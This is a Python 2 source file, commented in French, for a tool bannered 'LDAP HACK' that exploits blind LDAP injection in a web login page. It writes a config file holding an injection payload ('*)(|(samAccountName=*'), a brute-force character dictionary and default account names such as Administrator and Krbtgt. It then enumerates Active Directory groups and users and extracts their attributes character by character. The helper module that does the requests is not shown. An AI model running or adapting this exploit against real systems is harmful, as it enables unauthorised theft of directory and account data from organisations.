#!/usr/bin/python
# -*-coding: utf-8 -*-
import signal
import sys
import ConfigParser # Permet de parser le fichier de paramètres
import fonctions #Fichier qui regroupe toutes les fonctions du programme

class colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

########################################################################################
################################### Banière ############################################
########################################################################################

print """
  _        _____               _____      _    _               _____   _  __
 | |      |  __ \      /\     |  __ \    | |  | |     /\      / ____| | |/ /
 | |      | |  | |    /  \    | |__) |   | |__| |    /  \    | |      | ' / 
 | |      | |  | |   / /\ \   |  ___/    |  __  |   / /\ \   | |      |  <  
 | |____  | |__| |  / ____ \  | |        | |  | |  / ____ \  | |____  | . \ 
 |______| |_____/  /_/    \_\ |_|        |_|  |_| /_/    \_\  \_____| |_|\_\
                                                                            
                                                                            

		#########################################################
		#        CONDITION DE FONCTIONNEMENT                    #
		#                                                       #
		#   Sur site distant, filtre de recherche injectable    #
		#   Filtre de recherche de la forme:                    #
		#   (&(...=...)(cn=input))                              #
		#########################################################
		
		
		"""

########################################################################################
##############################  Creation Setting.ini  ##################################
########################################################################################

#si le fichier de conf n'existe pas, on le crée
if (fonctions.file_exists("settings.ini") == False):
	Config = ConfigParser.ConfigParser(allow_no_value=True)
	
	# lets create that config file
	cfgfile = open('settings.ini', 'w')
					  
							  
	# add the settings to the structure of the file, and lets write it out...
	Config.add_section('TARGET')
	Config.set('TARGET','url','http://192.168.103.101/notSecure/avecBlocageAccount/verification.php')
	Config.set('TARGET','champ', 'username=*)(|(samAccountName=*&password=)')
	#Config.set('TARGET', ';Il faut renseigner le keyword_TRUE OU le keyword_FALSE')
	Config.set('TARGET','keyword_FALSE', 'Login ou Password incorrect')
	Config.set('TARGET','keyword_TRUE', '')
	Config.set('TARGET','methode', 'GET')
	
	Config.add_section('CONFIG')
	Config.set('CONFIG','dictionnaire','0123456789abcdefghijklmnopqrstuvwxyz,?;.:/=+-!_@')
	Config.set('CONFIG','names_default', 'Administrator,Guest,DefaultAccount,Krbtgt,admin,root,dupond')
	Config.set('CONFIG','attributs_TEXT', 'Ordinateur,Contact,Groupe,Imprimante,Utilisateur,sAMAccountName,UserPrincipalName,description,mail,DisplayName,givenName,sn,cn,ou')
	Config.set('CONFIG','attributs_INT', 'adminCount,badPwdCount,logonCount')
							  				  
	Config.write(cfgfile)
	cfgfile.close()

########################################################################################
##########################  Recup Variables Setting.ini  ###############################
########################################################################################

#On lit le fichier de conf
config = ConfigParser.RawConfigParser() # On créé un nouvel objet "config"
config.read('settings.ini') # On lit le fichier de paramètres)

# Récupération basique dans des variables
url = config.get('TARGET','url')
# !!!! Ne pas mettre le nom du USER dans l'injection sinon le programme ne marchera pas correctement
champ = config.get('TARGET','champ')
keyword_FALSE = config.get('TARGET','keyword_FALSE')
keyword_TRUE = config.get('TARGET','keyword_TRUE')
methode = config.get('TARGET','methode')
dico = config.get('CONFIG','dictionnaire')
names_default_str = config.get('CONFIG','names_default')
names_default = names_default_str.split(",")
attributs_AD_TEXT_str = config.get('CONFIG','attributs_TEXT')
attributs_AD_TEXT = attributs_AD_TEXT_str.split(",")
attributs_AD_INT_str = config.get('CONFIG','attributs_INT')
attributs_AD_INT = attributs_AD_INT_str.split(",")


#url = "http://192.168.103.101/bad/verification.php"
#champ = "username=*)(|(samAccountName=*&password=)"
#keyword_FALSE = "Login ou Password incorrect "
#methode = "GET"
#dico = "0123456789abcdefghijklmnopqrstuvwxyz,?;.:/=+-!_@"
#attributs_AD_TEXT = ["Ordinateur","Contact","Groupe","Imprimante","Utilisateur","sAMAccountName","UserPrincipalName","description","mail","DisplayName","givenName","sn","cn","ou"]
#attributs_AD_INT = ["adminCount","badPwdCount","logonCount"]
#names_default = ["admin"]


#initialisations
compteur = 0
saisieOk = False
mauvaiseSaisie = True
goodFile = False


########################################################################################
#################################### MAIN ##############################################
########################################################################################

try:
	#On verifie le fichier de configuration settings.ini
	goodFile = fonctions.checkConfigFile(keyword_FALSE,keyword_TRUE,methode)
	
	if (goodFile):
		print "   (+) "  + colors.GREEN + "OK" + colors.ENDC
	else:
		sys.exit(0)
	
	#On verifie que le bruteforce d'attribut ne bloque pas d'utilisateur sinon on arrete le programme
	blocage = fonctions.checkAccountBlocking(names_default,url,champ,keyword_FALSE,keyword_TRUE,methode)
	
	if (blocage):
		sys.exit(0)

	else:
	
		#fonction qui cherche tous les groupes accessibles dans l'AD et les affiche
		print "\r"
		fonctions.find_groups(url,champ,methode,dico,keyword_FALSE,keyword_TRUE)

		#fonction qui cherche tous les users accessibles dans l'AD et les affiche
		print "\r"
		fonctions.find_users(url,champ,methode,dico,keyword_FALSE,keyword_TRUE)

		#demande à l'utilisateur de saisir un user
		print "\r"
		user = raw_input(colors.BOLD + "(*) Sélectionnez l'utilisateur: " + colors.ENDC)
		print "\r"

		#fonction qui recupere les attributs de type TEXT d'un User
		attributes_available_TEXT = fonctions.find_attributes_available_TEXT(user,url,champ,methode,attributs_AD_TEXT,keyword_FALSE,keyword_TRUE,dico)

		#fonction qui recupere les attributs de type INT
		attributes_available_INT = fonctions.find_attributes_available_INT(user,url,champ,methode,attributs_AD_INT,keyword_FALSE,keyword_TRUE,dico)

		#on forme une liste globale qui contient tous les attributs disponibles
		attributes_available_all = attributes_available_TEXT + attributes_available_INT

		#affichage des attributs dispos
		print colors.YELLOW + "(*) Voici les Attributs disponibles pour "+user+"... " + colors.ENDC
		print "   ("+str(compteur)+") all"
		for att in attributes_available_all:
			compteur += 1
			print "   ("+str(compteur)+") "+att

		while (1):
			while (mauvaiseSaisie):
				try:
					#demande à l'utilisateur de selectionner un attribut pour en connaitre la valeur
					print "\n"
					string_i = raw_input(colors.BOLD + "(*) Entrez le numéro de l'attribut désiré: " + colors.ENDC)
					i=int(string_i)
					mauvaiseSaisie = False

				#si la valeur entrée par l'utilisateur n'est pas un int
				except ValueError:
					print colors.RED + "   (!) Erreur : saisie incorrecte" + colors.ENDC
					mauvaiseSaisie = True

			#si le user a selectionné "all"
			if i == 0:
				#fonction qui affiche la valeur de tous les attributs pour 1 user
				fonctions.find_all_attributes(user,url,champ,methode,dico,keyword_FALSE,keyword_TRUE,attributes_available_TEXT,attributes_available_INT)
			elif (i >= 0 and i <= len(attributes_available_all)):
				#on va cherche l'element dans la liste
				selected_attribut = attributes_available_all[i-1]
				#fonction qui affiche la valeur d'un attribut spécifié pour un user
				fonctions.find_attribute(user,selected_attribut,attributes_available_TEXT,attributes_available_INT,url,champ,methode,dico,keyword_FALSE,keyword_TRUE)
			else:
				print colors.RED + "   (!) Erreur: saisie incorrecte" + colors.ENDC
			#on reinitialise
			mauvaiseSaisie = True
		
			
except KeyboardInterrupt:
	print "\r"
	sys.exit(0)
